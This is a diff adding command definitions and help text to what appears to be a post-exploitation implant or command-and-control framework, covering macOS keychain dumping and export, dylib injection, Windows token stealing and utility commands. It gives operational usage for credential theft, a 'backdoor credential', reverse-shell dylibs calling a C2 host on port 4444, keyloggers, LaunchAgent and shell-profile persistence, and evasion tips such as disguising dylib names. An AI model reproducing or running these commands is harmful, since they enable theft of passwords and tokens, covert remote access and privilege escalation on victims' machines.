+keychain delete --service <service> --account <account>
+keychain export --keychain <path> --output <file>
+keychain unlock --keychain <path> --password <password>
+"""
+examples = [
+    "keychain list",
+    "keychain dump",
+    "keychain dump --keychain login.keychain-db",
+    "keychain search --service gmail",
+    "keychain search --account admin@company.com",
+    "keychain search --service outlook --account user@outlook.com",
+    "keychain add --service myapp --account admin --password SecretPass123",
+    "keychain delete --service myapp --account admin",
+    "keychain export --keychain login.keychain-db --output /tmp/keychain.txt",
+    "keychain unlock --keychain login.keychain-db --password MyPassword"
+]
+help = """
+Accesses and manipulates macOS Keychain:
+
+ACTIONS:
+
+1. LIST - Show available keychains:
+   - Lists all keychains in search path
+   - Shows default login keychain
+   - Checks accessibility of each keychain
+   - Lists keychains in ~/Library/Keychains/
+
+2. DUMP - Extract keychain contents:
+   - Options:
+     --keychain <path>  Specific keychain (default: login keychain)
+   - Dumps generic passwords
+   - Dumps internet passwords
+   - Lists certificates
+   - Note: Keychain must be unlocked
+   - Passwords shown in plaintext when accessible
+
+3. SEARCH - Find specific items:
+   - Options:
+     --service <name>   Service/application name
+     --account <name>   Account username
+     --label <label>    Item label
+   - Searches both generic and internet passwords
+   - Shows password if accessible
+   - Can combine search criteria
+
+4. ADD - Create keychain item:
+   - Options:
+     --service <name>   Service name (required)
+     --account <name>   Account name (required)
+     --password <pass>  Password (required)
+   - Adds generic password entry
+   - Allows access by all applications
+
+5. DELETE - Remove keychain item:
+   - Options:
+     --service <name>   Service name
+     --account <name>   Account name
+   - At least one option required
+   - Removes matching items
+
+6. EXPORT - Export keychain data:
+   - Options:
+     --keychain <path>  Source keychain (required)
+     --output <file>    Output file (required)
+   - Attempts PKCS12 export first
+   - Falls back to text dump if needed
+   - Exported data includes passwords
+
+7. UNLOCK - Unlock a keychain:
+   - Options:
+     --keychain <path>  Keychain to unlock (default: login)
+     --password <pass>  Keychain password (required)
+   - Allows access to protected items
+   - Unlock persists for session
+
+KEYCHAIN TYPES:
+- login.keychain-db: User's default keychain
+- System.keychain: System-wide keychain (requires root)
+- iCloud Keychain: Synced items (limited access)
+- Custom keychains: User-created keychains
+
+COMMON PASSWORDS FOUND:
+- Web passwords (Safari, Chrome)
+- Email account passwords
+- WiFi passwords (System keychain)
+- Application passwords
+- SSH keys passphrases
+- Certificate private keys
+- Token/API keys
+
+SECURITY NOTES:
+- Modern macOS requires user approval for keychain access
+- Some items protected by TouchID/password
+- System keychain requires root access
+- Keychain dumping logged by endpoint security
+- TCC protections may prevent access
+
+OPERATIONAL TIPS:
+- Unlock keychain first for full access
+- Search for specific services of interest
+- Export for offline analysis
+- Check all available keychains
+- Look for plaintext passwords in dumps
+
+EXAMPLES:
+  # List all keychains
+  keychain list
+  
+  # Dump default keychain (must be unlocked)
+  keychain dump
+  
+  # Search for email passwords
+  keychain search --service gmail
+  keychain search --service outlook
+  keychain search --service mail
+  
+  # Search for specific account
+  keychain search --account admin@target.com
+  
+  # Add backdoor credential
+  keychain add --service backdoor --account admin --password infected
+  
+  # Export for offline analysis
+  keychain export --keychain login.keychain-db --output /tmp/creds.txt
+  
+  # Unlock with known password
+  keychain unlock --password UserPassword123
+"""
+
+[commands.dyld-inject]
+fileName = "dyld-inject"
+name = "dyld-inject"
+os_compatibility = ["darwin"]
+description = "DYLD library injection for process hooking and manipulation"
+syntax = """
+dyld-inject test
+dyld-inject generate --output <dylib_path> --payload <type> [--host <ip>] [--port <port>]
+dyld-inject inject --dylib <path> --target <binary>
+dyld-inject persist --dylib <path> --method <environment|plist>
+"""
+examples = [
+    "dyld-inject test",
+    "dyld-inject generate --output /tmp/hook.dylib --payload log",
+    "dyld-inject generate --output /tmp/shell.dylib --payload reverse-shell --host 10.0.0.1 --port 4444",
+    "dyld-inject generate --output /tmp/keylog.dylib --payload keylogger",
+    "dyld-inject generate --output /tmp/screen.dylib --payload screenshot",
+    "dyld-inject inject --dylib /tmp/hook.dylib --target /usr/bin/curl",
+    "dyld-inject inject --dylib /tmp/evil.dylib --target '/Applications/Firefox.app/Contents/MacOS/firefox'",
+    "dyld-inject persist --dylib /tmp/hook.dylib --method environment",
+    "dyld-inject persist --dylib /tmp/evil.dylib --method plist"
+]
+help = """
+DYLD_INSERT_LIBRARIES injection for macOS process manipulation:
+
+ACTIONS:
+
+1. TEST - Check injection capability:
+   - Verifies System Integrity Protection (SIP) status
+   - Tests DYLD_INSERT_LIBRARIES functionality
+   - Lists injectable processes/binaries
+   - Checks code signing restrictions
+   - Reports which binaries can be hooked
+
+2. GENERATE - Create malicious dylib:
+   - Options:
+     --output <path>      Output dylib path (required)
+     --payload <type>     Payload type (required):
+       * log:             Log process activity to file
+       * reverse-shell:   Connect back shell (requires --host --port)
+       * keylogger:       Capture keystrokes
+       * screenshot:      Capture screen periodically
+       * persistence:     Establish persistence
+     --host <ip>         C2 server for reverse shell
+     --port <port>       C2 port for reverse shell
+   - Compiles dylib with specified payload
+   - Uses clang with necessary frameworks
+
+3. INJECT - Hook into target process:
+   - Options:
+     --dylib <path>      Dylib to inject (required)
+     --target <binary>   Target binary path (required)
+   - Executes target with DYLD_INSERT_LIBRARIES
+   - Hooks run in target's process space
+   - Output shows injection success/failure
+
+4. PERSIST - Persistent injection:
+   - Options:
+     --dylib <path>      Dylib to persist (required)
+     --method <type>     Persistence method (required):
+       * environment:    Add to shell environment (.zshenv, .bash_profile)
+       * plist:         Create LaunchAgent with injection
+   - Environment method affects all processes from shell
+   - Plist method creates service with injection
+
+PAYLOAD DETAILS:
+
+LOG PAYLOAD:
+- Logs process name, PID, UID, username
+- Records environment variables
+- Writes to /tmp/.dyld_injection.log
+
+REVERSE SHELL:
+- Connects to specified host:port
+- Spawns shell with network redirection
+- Runs in background thread
+- Uses default shell from $SHELL
+
+KEYLOGGER:
+- Captures all keystrokes
+- Writes to /tmp/.keylog.txt
+- Requires accessibility permissions
+- Uses CGEventTap API
+
+SCREENSHOT:
+- Captures screen on library load
+- Saves to /tmp/.screenshot_<pid>.png
+- Can be modified for periodic capture
+
+PERSISTENCE:
+- Creates hidden directory in home
+- Adds backdoor script
+- Modifies shell RC files
+- Establishes recurring execution
+
+LIMITATIONS & REQUIREMENTS:
+
+SIP (System Integrity Protection):
+- When enabled: Can't inject into system binaries
+- When disabled: Full injection capability
+- Check with: csrutil status
+
+Code Signing:
+- Restricted binaries reject unsigned dylibs
+- Library validation prevents injection
+- Third-party apps often injectable
+
+Permissions:
+- Keylogger needs accessibility access
+- Screenshot needs screen recording permission
+- Some injections require root
+
+INJECTABLE TARGETS:
+- Third-party applications (/Applications/*)
+- Homebrew binaries (/usr/local/bin/*)
+- User-installed tools
+- Scripts and interpreters
+- Network tools (curl, wget)
+
+NON-INJECTABLE (with SIP):
+- System binaries (/usr/bin/*, /bin/*)
+- Apple applications
+- Signed & restricted binaries
+- Processes with library validation
+
+DETECTION & EVASION:
+- Injection visible in process environment
+- Endpoint security monitors DYLD variables
+- Sign dylibs to reduce suspicion
+- Use innocuous names for dylibs
+- Clear DYLD variables after injection
+
+OPERATIONAL EXAMPLES:
+
+  # Test environment
+  dyld-inject test
+  
+  # Create logging dylib
+  dyld-inject generate --output /tmp/libsystem.dylib --payload log
+  
+  # Hook curl to log activity
+  dyld-inject inject --dylib /tmp/libsystem.dylib --target /usr/bin/curl
+  
+  # Reverse shell dylib
+  dyld-inject generate --output /tmp/libcrypto.dylib --payload reverse-shell --host 192.168.1.100 --port 4444
+  
+  # Inject into Firefox
+  dyld-inject inject --dylib /tmp/libcrypto.dylib --target '/Applications/Firefox.app/Contents/MacOS/firefox'
+  
+  # Persistent environment injection
+  dyld-inject persist --dylib /tmp/libsystem.dylib --method environment
+  
+  # Keylogger (requires accessibility)
+  dyld-inject generate --output /tmp/libinput.dylib --payload keylogger
+  dyld-inject persist --dylib /tmp/libinput.dylib --method plist
+
+CLEANUP:
+- Remove dylib files
+- Clear environment variables
+- Unload LaunchAgents
+- Check ~/.zshenv and ~/.bash_profile
+- Review /tmp/ for log files
+"""
+
+[commands.rm]
+fileName = "rm"
+name = "rm"
+os_compatibility = "all"
+description = "Remove files and directories from the target system"
+syntax = """
+rm <file/directory>...                    # Remove files
+rm -r <directory>...                      # Remove directories recursively
+rm -f <file/directory>...                 # Force removal, ignore errors
+rm -rf <directory>...                     # Force recursive removal
+rm --recursive <directory>...             # Long form of -r
+rm --force <file/directory>...            # Long form of -f
+"""
+examples = [
+    "rm file.txt",                          # Remove single file
+    "rm file1.txt file2.txt file3.txt",     # Remove multiple files
+    "rm -r /tmp/test_dir",                  # Remove directory recursively
+    "rm -rf /var/log/old_logs",             # Force remove directory
+    "rm -f nonexistent.txt",                # No error if file doesn't exist
+    "rm -r dir1 dir2 dir3",                 # Remove multiple directories
+    "rm -rf C:\\Temp\\*",                   # Windows: Force remove all in Temp
+    "rm --recursive --force /tmp/cache"     # Long form flags
+]
+help = """
+Removes files and directories from the target system.
+
+FLAGS:
+  -r, -R, --recursive   Remove directories and their contents recursively
+  -f, --force          Ignore nonexistent files, suppress errors
+  -rf, -fr             Combine recursive and force (common usage)
+
+EXAMPLES BY USE CASE:
+
+Remove temporary files:
+  rm /tmp/*.log                # Remove all log files
+  rm -f /tmp/cache_*           # Force remove cache files
+
+Clean up directories:
+  rm -r build/                 # Remove build directory
+  rm -rf node_modules/         # Force remove dependencies
+
+Batch removal:
+  rm *.bak *.tmp *.log         # Remove multiple file types
+  rm -r old_* archive_*        # Remove multiple directories
+
+Windows examples:
+  rm C:\\Users\\Public\\file.txt     # Remove single file
+  rm -r C:\\Temp\\TestFolder         # Remove folder
+  rm -rf C:\\Windows\\Temp\\*         # Clean temp (requires admin)
+
+Unix/Linux examples:
+  rm /var/log/app.log               # Remove log file
+  rm -r ~/.cache/                   # Remove cache directory
+  rm -rf /tmp/session-*             # Remove session files
+"""
+
+[commands.whoami]
+fileName = "whoami"
+name = "whoami"
+os_compatibility = "all"
+description = "Display current user information"
+syntax = """
+whoami                    # Show current username
+whoami -v                 # Show detailed user and system information
+whoami --verbose          # Same as -v
+whoami -h                 # Show help
+whoami --help             # Same as -h
+"""
+examples = [
+    "whoami",                               # Basic usage
+    "whoami -v",                            # Verbose output
+    "whoami --verbose"                      # Long form verbose
+]
+help = """
+Displays information about the current user and system context.
+
+MODES:
+  Basic:    Shows just the username
+  Verbose:  Shows comprehensive user, system, and environment information
+
+FLAGS:
+  -v, --verbose    Display detailed information including:
+                   - User ID and Group ID
+                   - Home directory
+                   - System information (OS, architecture, hostname)
+                   - Process information (PID, PPID)
+                   - Privilege level
+                   - Environment variables
+                   - Session information
+                   - Group memberships (Unix/Linux)
+  
+  -h, --help       Show usage information
+
+BASIC OUTPUT:
+Returns the current username in the format:
+  - Unix/Linux: username
+  - Windows: DOMAIN\\username or COMPUTER\\username
+
+VERBOSE OUTPUT SECTIONS:
+
+User Information:
+  - Username (full format on Windows with domain)
+  - User ID (UID on Unix, SID on Windows)
+  - Group ID (primary group)
+  - Home directory path
+  - Domain and account (Windows only)
+
+System Information:
+  - Operating system type
+  - Architecture (x64, x86, arm64, etc.)
+  - Hostname
+  - Process ID of the agent
+  - Parent process ID
+  - Current working directory
+
+Environment:
+  - Privilege level detection
+  - Key environment variables
+  - Shell information
+  - Terminal type
+
+Session Information:
+  - SSH connection details (if applicable)
+  - Remote desktop session (Windows)
+  - TTY/PTY information (Unix/Linux)
+  - Display server (X11)
+
+Group Memberships (Unix/Linux only):
+  - All groups the user belongs to
+  - Group IDs and names
+
+PRIVILEGE DETECTION:
+
+Windows:
+  - "Administrator (elevated)" - Running with admin rights
+  - "Possibly elevated" - May have admin in some contexts
+  - "Standard user" - No admin privileges
+
+Unix/Linux:
+  - "root (superuser)" - Running as root
+  - "Elevated via sudo" - Running with sudo
+  - "Standard user (with sudo capability)" - User in sudo/wheel group
+  - "Standard user" - No elevated privileges
+
+EXAMPLES BY USE CASE:
+
+Quick identity check:
+  whoami                    # Just show who I am
+
+Privilege escalation check:
+  whoami -v | grep Privileges    # Check current privilege level
+
+Full context gathering:
+  whoami -v                      # Complete user and system context
+
+Domain information (Windows):
+  whoami                         # Shows DOMAIN\\username format
+
+SSH session detection:
+  whoami -v | grep SSH          # Check if in SSH session
+"""
+
+[commands.rev2self]
+fileName = "rev2self"
+name = "rev2self"
+os_compatibility = ["windows"]
+description = "Revert token impersonation and return to original security context"
+syntax = "rev2self"
+examples = [
+    "rev2self"                              # Simple revert
+]
+help = """
+Reverts any active token impersonation and returns to the original security context.
+
+OVERVIEW:
+Universal command to revert impersonation from both steal-token and make-token.
+Cleans up impersonation handles and resets to the process's original token.
+Safe to call even when not impersonating.
+
+USAGE:
+  rev2self                            # Revert any active impersonation
+
+BEHAVIOR:
+- Calls Windows RevertToSelf API
+- Cleans up stored impersonation handles
+- Resets internal impersonation state
+- Shows before/after user context
+- Safe to call multiple times
+
+WORKS WITH:
+- steal-token impersonations
+- make-token impersonations
+- Any other token manipulations
+
+EXAMPLES:
+
+After steal-token:
+  steal-token 1752                    # Become SYSTEM
+  whoami                              # Shows SYSTEM
+  rev2self                            # Revert
+  whoami                              # Shows original user
+
+After make-token:
+  make-token CORP\\admin Pass123      # Create token
+  make-token impersonate              # Use token
+  whoami                              # Shows CORP\\admin
+  rev2self                            # Revert
+  whoami                              # Shows original user
+
+Chain operations:
+  steal-token 4532                    # Steal user1
+  # ... operations as user1 ...
+  make-token CORP\\svc Pass456        # Create service token
+  make-token impersonate              # Use service token
+  # ... operations as service ...
+  rev2self                            # Back to original
+"""
+
+[commands.token]
+fileName = "token"
+name = "token"
+os_compatibility = ["windows"]
+description = "Comprehensive token management for impersonation and lateral movement"
+syntax = """
+token create <DOMAIN\\user> <pass> <name> [type]
+token create netonly <DOMAIN\\user> <pass> <name>
+token steal <pid> [name] [netonly]
+token store <pid> <name> [netonly]
+token use <name> [netonly]
+token impersonate
+token netonly [set|clear|status]
+token list [processes]
+token current
+token remove <name>
+token clear
+token revert
+"""
+examples = [
+    "token create CORP\\admin Pass123 admin-tok",
+    "token create netonly REMOTE\\svc SvcPass remote-net",
+    "token steal 1752 system-tok",
+    "token store 4568 backup-tok netonly",
+    "token use admin-tok",
+    "token netonly set remote-admin",
+    "token list processes",
+    "token current",
+    "token revert"
+]
+help = """
+OVERVIEW:
+Unified token management system for creating, stealing, and managing Windows security tokens.
+Supports both full impersonation and network-only tokens for flexible privilege escalation.
+All tokens are stored in a unified repository accessible across operations.
+
+CORE CONCEPTS:
+- Full Impersonation: Changes both local and network identity
+- Network-Only: Affects only network operations, preserves local identity
+- Unified Store: All tokens (created or stolen) share the same storage
+
+VERBS:
+
+═══ TOKEN CREATION ═══
+
+create <DOMAIN\\user> <pass> <n> [type] - Create token via LogonUser:
+  Creates a new token using Windows LogonUser API
+  Default type is 'interactive' if not specified
+  Token is stored but NOT automatically used
+  Example: token create CORP\\admin Pass123 admin-tok
+  
+create netonly <DOMAIN\\user> <pass> <n> - Create network-only token:
+  Creates token specifically for network operations
+  Local operations remain unaffected
+  Must activate with 'token netonly set'
+  Example: token create netonly REMOTE\\svc SvcPass remote-net
+
+═══ TOKEN STEALING ═══
+
+steal <pid> [name] [netonly] - Steal and impersonate:
+  Duplicates target process token
+  Immediately impersonates (unless netonly)
+  Auto-generates name if not provided
+  Example: token steal 1752 system-tok
+  Example: token steal 1752 net-tok netonly
+
+store <pid> <n> [netonly] - Store without using:
+  Duplicates and stores token for later
+  Does NOT impersonate immediately
+  Build a library of tokens
+  Example: token store 4568 backup-tok netonly
+
+list processes - Show stealable tokens:
+  Enumerates all accessible process tokens
+  Shows process name, PID, and owner
+  Identifies current process
+  Example: token list processes
+
+═══ TOKEN USAGE ═══
+
+use <n> [netonly] - Activate stored token:
+  Switches to any stored token
+  Works with both created and stolen tokens
+  Optional netonly for network-only activation
+  Example: token use admin-tok
+  Example: token use remote-tok netonly
+
+impersonate - Quick impersonation:
+  Uses most recent created token
+  Skips network-only tokens
+  Shortcut for common workflow
+  Example: token impersonate
+
+═══ NETWORK-ONLY MANAGEMENT ═══
+
+netonly set <n> - Set network token:
+  Activates token for network operations only
+  Local identity remains unchanged
+  Can be combined with full impersonation
+  Example: token netonly set remote-admin
+
+netonly clear - Clear network token:
+  Removes active network-only token
+  Network ops revert to current identity
+  Does not affect full impersonation
+  Example: token netonly clear
+
+netonly status - Show network status:
+  Displays active network-only token
+  Shows tokens marked as network-only
+  Lists current configuration
+  Example: token netonly status
+
+═══ TOKEN INFORMATION ═══
+
+list - Show all stored tokens:
+  Displays complete token inventory
+  Shows user, source, and metadata
+  Indicates active tokens
+  Example: token list
+
+stored - Alias for list:
+  Same as 'token list'
+  Shows all tokens in store
+  Example: token stored
+
+current - Show token status:
+  Displays current effective identity
+  Shows active impersonation
+  Shows network-only token if set
+  Example: token current
+
+status - Alias for current:
+  Same as 'token current'
+  Example: token status
+
+═══ TOKEN CLEANUP ═══
+
+remove <n> - Delete stored token:
+  Removes token from store
+  Cannot remove active tokens
+  Frees associated resources
+  Example: token remove backup-tok
+
+clear - Remove all created tokens:
+  Cleans up all LogonUser tokens
+  Does not affect stolen tokens
+  Handles active tokens gracefully
+  Example: token clear
+
+revert - Revert all impersonation:
+  Returns to original identity
+  Clears both full and network tokens
+  Same as rev2self command
+  Example: token revert
+
+═════════════════════════════════════════════════
+
+LOGON TYPES FOR CREATE:
+  interactive       - Interactive logon (default)
+  network          - Network logon (no local access)  
+  batch            - Batch job logon
+  service          - Service account logon
+  network_cleartext - Network with cleartext credentials
+  new_credentials  - Clone current with new network creds
+
+WORKFLOW EXAMPLES:
+
+Basic Token Theft:
+  token list processes              # Find target process
+  token steal 1752 system          # Steal and impersonate
+  whoami                           # Verify new identity
+  token revert                     # Return to original
+
+Network-Only Access:
+  token create netonly CORP\\admin Pass123 corp-net
+  token netonly set corp-net      # Activate for network
+  net use \\\\dc01\\c$              # Uses CORP\\admin
+  dir C:\\                          # Uses original identity
+  token netonly clear              # Deactivate
+
+Building Token Library:
+  token store 1752 system-tok     # Store SYSTEM token
+  token store 2140 admin-tok      # Store admin token
+  token create CORP\\svc Pass svc-tok  # Create service token
+  token list                      # View all tokens
+  token use admin-tok             # Switch as needed
+
+Mixed Operations:
+  token steal 1752 local-system   # Full impersonation
+  token create netonly REMOTE\\admin Pass remote-net
+  token netonly set remote-net    # Set network token
+  # Now: Local = SYSTEM, Network = REMOTE\\admin
+"""
